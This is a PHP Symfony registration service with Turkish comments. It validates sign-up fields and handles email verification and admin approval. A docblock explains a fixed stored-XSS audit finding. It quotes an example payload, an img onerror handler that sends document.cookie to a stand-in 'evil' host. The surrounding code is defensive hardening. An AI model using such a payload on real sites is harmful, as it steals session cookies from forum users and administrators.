<?php

declare(strict_types=1);

namespace App\Core\Account;

use App\Core\Mail\CpMailerService;
use App\Core\Settings\SettingsRegistry;
use App\Entity\User;
use App\Repository\UserRepository;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
use Symfony\Contracts\Translation\TranslatorInterface;

/**
 * MegaforBB AuthService::register() + AdminUserSettings akışının CPalius karşılığı.
 */
final class AccountRegistrationService
{
    public const FIELD_HIDDEN = '0';
    public const FIELD_OPTIONAL = '1';
    public const FIELD_REQUIRED = '2';

    /**
     * Ad/soyad için izin verilen karakterler (denetim bulgusu SEC-03).
     * Gerekçe ve tehdit modeli için validateNameField() docblock'una bakın.
     *
     * \p{L}  -> her alfabeden harf (Türkçe ğüşıöç, Kiril, Arapça, CJK…)
     * \p{M}  -> birleşim işaretleri (aksanların ayrı kod noktası olduğu diller)
     * ' - .  -> "O'Brien", "Jean-Luc", "Dr. Ayşe" gibi meşru adlar
     * boşluk -> çok parçalı adlar
     */
    private const NAME_PATTERN = "/^[\p{L}\p{M}\x{0020}\x{00A0}'\x{2019}.\-]+$/u";

    /**
     * Asset::$originalName gibi bir DB kolonu sınırı değil, bilinçli bir
     * ürün kararıdır: 60 karakter, dünyadaki en uzun meşru adları bile
     * rahat kapsar ve şablonlarda satır taşmasını önler.
     */
    private const NAME_MAX_LENGTH = 60;

    public function __construct(
        private readonly SettingsRegistry $settingsRegistry,
        private readonly UserRepository $userRepository,
        private readonly EntityManagerInterface $entityManager,
        private readonly UrlGeneratorInterface $urlGenerator,
        private readonly TranslatorInterface $translator,
        private readonly CpMailerService $mailerService,
    ) {
    }

    public function isRegistrationEnabled(): bool
    {
        return (bool) ($this->settingsRegistry->get('account.registration_enabled') ?? true);
    }

    public function isEmailVerificationRequired(): bool
    {
        return (bool) ($this->settingsRegistry->get('account.require_email_verification') ?? false);
    }

    public function isAdminApprovalRequired(): bool
    {
        return (bool) ($this->settingsRegistry->get('account.require_admin_approval') ?? false);
    }

    public function isUsernameRequired(): bool
    {
        return (bool) ($this->settingsRegistry->get('account.username_required') ?? true);
    }

    public function isTermsRequired(): bool
    {
        return (bool) ($this->settingsRegistry->get('account.require_terms') ?? true);
    }

    public function firstNameMode(): string
    {
        return (string) ($this->settingsRegistry->get('account.show_first_name') ?? self::FIELD_REQUIRED);
    }

    public function lastNameMode(): string
    {
        return (string) ($this->settingsRegistry->get('account.show_last_name') ?? self::FIELD_REQUIRED);
    }

    /**
     * @return array{email: string, username: string, firstName: string, lastName: string, locale: string}
     */
    public function defaultFormValues(): array
    {
        return [
            'email' => '',
            'username' => '',
            'firstName' => '',
            'lastName' => '',
            'locale' => 'tr',
        ];
    }

    /**
     * @param array{email: string, username: string, firstName: string, lastName: string, password: string, passwordConfirm: string, termsAccepted: bool, locale: string} $input
     *
     * @return string[]
     */
    public function validate(array $input): array
    {
        $errors = [];
        $email = trim($input['email']);
        $username = trim($input['username']);
        $password = $input['password'];
        $passwordConfirm = $input['passwordConfirm'];

        if ($email === '' || !filter_var($email, \FILTER_VALIDATE_EMAIL)) {
            $errors[] = $this->translator->trans('account.register.invalid_email');
        } elseif ($this->userRepository->isEmailTakenByAnotherUser($email, null)) {
            $errors[] = $this->translator->trans('account.register.email_taken');
        }

        if ($this->isUsernameRequired() && $username === '') {
            $errors[] = $this->translator->trans('account.register.username_required');
        } elseif ($username !== '') {
            if (!preg_match('/^[a-zA-Z0-9_]{3,50}$/', $username)) {
                $errors[] = $this->translator->trans('account.register.username_invalid');
            } elseif ($this->userRepository->findOneByUsername($username) !== null) {
                $errors[] = $this->translator->trans('account.register.username_taken');
            }
        }

        $errors = array_merge($errors, $this->validateNameField('firstName', $this->firstNameMode(), trim($input['firstName'])));
        $errors = array_merge($errors, $this->validateNameField('lastName', $this->lastNameMode(), trim($input['lastName'])));

        if (mb_strlen($password) < 8) {
            $errors[] = $this->translator->trans('account.register.password_too_short');
        } elseif ($password !== $passwordConfirm) {
            $errors[] = $this->translator->trans('account.register.password_mismatch');
        }

        if ($this->isTermsRequired() && !$input['termsAccepted']) {
            $errors[] = $this->translator->trans('account.register.terms_required');
        }

        return $errors;
    }

    public function applyPostRegistrationState(User $user): bool
    {
        $needsDefer = false;

        if ($this->isAdminApprovalRequired()) {
            $user->setStatus(User::STATUS_INACTIVE);
            $user->setDataValue('registration_pending_approval', true);
            $needsDefer = true;
        }

        if ($this->isEmailVerificationRequired()) {
            $user->setEmailVerificationToken($this->generateToken());
            $needsDefer = true;
        } else {
            $user->markEmailVerified();
        }

        if ($needsDefer) {
            $this->entityManager->flush();
        }

        return $needsDefer;
    }

    public function verifyEmailByToken(string $token): ?User
    {
        $user = $this->userRepository->findOneByEmailVerificationToken($token);
        if ($user === null) {
            return null;
        }

        $user->markEmailVerified();
        $this->entityManager->flush();

        return $user;
    }

    public function approveUser(User $user): void
    {
        $user->setStatus(User::STATUS_ACTIVE);
        $user->markRegistrationApproved();
        $this->entityManager->flush();
    }

    public function buildVerificationUrl(User $user): ?string
    {
        $token = $user->getEmailVerificationToken();
        if ($token === null || $token === '') {
            return null;
        }

        return $this->urlGenerator->generate('account_verify_email', ['token' => $token], UrlGeneratorInterface::ABSOLUTE_URL);
    }

    public function sendVerificationEmail(User $user): bool
    {
        if (!$this->isEmailVerificationRequired()) {
            return false;
        }

        $url = $this->buildVerificationUrl($user);
        if ($url === null || !$this->mailerService->canSend()) {
            return false;
        }

        try {
            $this->mailerService->sendHtml(
                $user->getEmail(),
                $this->translator->trans('account.verify.email_subject'),
                $this->translator->trans('account.verify.email_body_html', ['url' => $url, 'site' => $this->settingsRegistry->get('core.site_name') ?? 'CPalius']),
                $this->translator->trans('account.verify.email_body_text', ['url' => $url]),
            );

            return true;
        } catch (\Throwable) {
            return false;
        }
    }

    /**
     * Ad/soyad alanlarının doğrulaması (denetim bulgusu SEC-03).
     *
     * ── Neden bu metot sertleştirildi ────────────────────────────────────
     *
     * Önceki hâli YALNIZCA "boş mu" kontrolü yapıyordu: uzunluk sınırı,
     * karakter kısıtı, HTML denetimi yoktu. Bu değer User::getFullName()
     * üzerinden ForumTopic::$firstPosterName alanına DENORMALİZE edilerek
     * kopyalanıyor ve forum konu listesinde basılıyordu. Şablonun o
     * satırında "|raw" kullanıldığı için, kayıt açıkken kimliği
     * doğrulanmamış bir ziyaretçi adına
     *
     *     <img src=x onerror="fetch('//evil/?c='+document.cookie)">
     *
     * yazarak listeyi gören HERKESTE — moderatörler ve yöneticiler dahil —
     * script çalıştırabiliyordu.
     *
     * ── İki bağımsız katman ──────────────────────────────────────────────
     *
     * Bu metot BİRİNCİ katmandır: zararlı karakterler veritabanına hiç
     * girmez. İKİNCİ katman şablon tarafındadır (forum/topics.html.twig,
     * artık "|e" ile kaçırılıyor) ve asıl yükü o taşır — çünkü
     * firstPosterName bir ANLIK GÖRÜNTÜdür: bu düzeltmeden önce kaydolmuş
     * kullanıcıların adları veritabanında zaten durmaktadır ve girdi
     * doğrulaması onları geriye dönük temizlemez.
     *
     * ── İzin verilen karakter kümesi ─────────────────────────────────────
     *
     * Unicode harfleri (\p{L}) ve birleşim işaretleri (\p{M}) — Türkçe,
     * Arapça, Kiril, CJK dahil her alfabe çalışır. Ayrıca boşluk, tire,
     * nokta ve kesme işareti: "Ali Çömez", "Jean-Luc", "O'Brien",
     * "Dr. Ayşe" gibi meşru adlar bozulmadan geçer.
     *
     * "<", ">", "&", tırnak ve tüm kontrol karakterleri BİLİNÇLİ OLARAK
     * dışarıda kalır — hiçbir meşru insan adında bulunmazlar ve tam olarak
     * bu karakterler HTML enjeksiyonunu mümkün kılar. Rakam da dışarıdadır
     * (ad alanı bir kullanıcı adı değildir; kullanıcı adı ayrıca ve daha
     * dar bir kalıpla doğrulanır, bkz. validate()).
     *
     * @return string[]
     */
    private function validateNameField(string $field, string $mode, string $value): array
    {
        if ($mode === self::FIELD_HIDDEN) {
            return [];
        }

        $isFirstName = $field === 'firstName';

        if ($value === '') {
            if ($mode === self::FIELD_REQUIRED) {
                return [$this->translator->trans(
                    $isFirstName ? 'account.register.first_name_required' : 'account.register.last_name_required',
                )];
            }

            // Opsiyonel ve boş: doğrulanacak bir şey yok.
            return [];
        }

        $errors = [];

        if (mb_strlen($value) > self::NAME_MAX_LENGTH) {
            $errors[] = $this->translator->trans(
                $isFirstName ? 'account.register.first_name_too_long' : 'account.register.last_name_too_long',
            );
        }

        // "u" bayrağı ZORUNLU: onsuz \p{L} çalışmaz ve çok baytlı
        // karakterler bayt bayt değerlendirilir.
        if (preg_match(self::NAME_PATTERN, $value) !== 1) {
            $errors[] = $this->translator->trans(
                $isFirstName ? 'account.register.first_name_invalid' : 'account.register.last_name_invalid',
            );
        }

        return $errors;
    }

    private function generateToken(): string
    {
        return rtrim(strtr(base64_encode(random_bytes(32)), '+/', '-_'), '=');
    }
}
